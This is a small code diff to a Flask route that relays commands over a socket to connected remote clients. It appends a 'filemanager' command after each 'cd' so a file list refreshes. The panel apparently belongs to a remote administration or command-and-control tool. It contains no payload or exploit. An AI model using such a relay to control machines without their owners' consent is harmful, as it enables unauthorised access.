@@ -205,7 +205,13 @@ def send_command_route():
 
     try:
         add_log(f"[SEND] to {client_id}: {cmd}")
-        client_socket.sendall(f"{cmd}\n".encode())
+        
+        # Auto-refresh file list after directory change
+        full_payload = f"{cmd}\n"
+        if cmd.startswith('cd '):
+            full_payload += "filemanager\n"
+            
+        client_socket.sendall(full_payload.encode())
         return jsonify({"status": "success"})
     except Exception as e:
         add_log(f"[ERROR] Failed to send command to {client_id}: {e}")
